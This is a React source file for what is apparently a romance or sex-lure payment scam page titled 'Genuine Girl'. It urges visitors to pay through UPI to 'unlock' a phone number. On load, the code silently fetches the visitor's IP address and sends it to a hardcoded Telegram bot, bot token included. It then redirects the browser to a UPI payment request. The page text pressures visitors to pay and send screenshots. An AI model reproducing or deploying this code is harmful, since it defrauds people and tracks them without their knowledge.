import './App.css';

let ip = 'Not Found'



function App() {
  setTimeout(()=>{
    fetch('https://api.db-ip.com/v2/free/self')
    .then(result => result.json())
    .then((output) => {
        ip = output;
        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=PAYMENT--------${ip.ipAddress}`
        fetch(url, {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: ''
        }).then(res => {
            console.log("Request complete!");
            window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ReddyGirl&tn=Cute_Girl","_self");
        })
    }).catch(err => console.error(err));
  },200)
  return (
    <div className="App">
      <header className="App-header">
      <h1 style={{marginTop:"-50px", paddingBottom:'0px'}}>🍆Genuine Girl!!🍆</h1>
      <a  id="myButton1" className="button" type="button" href="upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=cute_girl&tn=Cute_Girl">PAY NOW!!</a>
      <h6>You should PAY first to Unlock My Number!!😜</h6>
      <a  id="myButton1" className="button" type="button" href="upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=cute_girl&tn=Cute_Girl">PAY NOW!!</a>
      <h6>Click Below👇 For My Whatsapp Number!!</h6>
      <a  id="myButton" className="button1" type="button" href="upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=cute_girl&tn=beautiful_girl&am=700">Whatsapp!!</a>
      <h6>PAY NOW and Send me screenshot on Telegram!!🥰</h6>
      </header>
    </div>
  );
}

export default App;
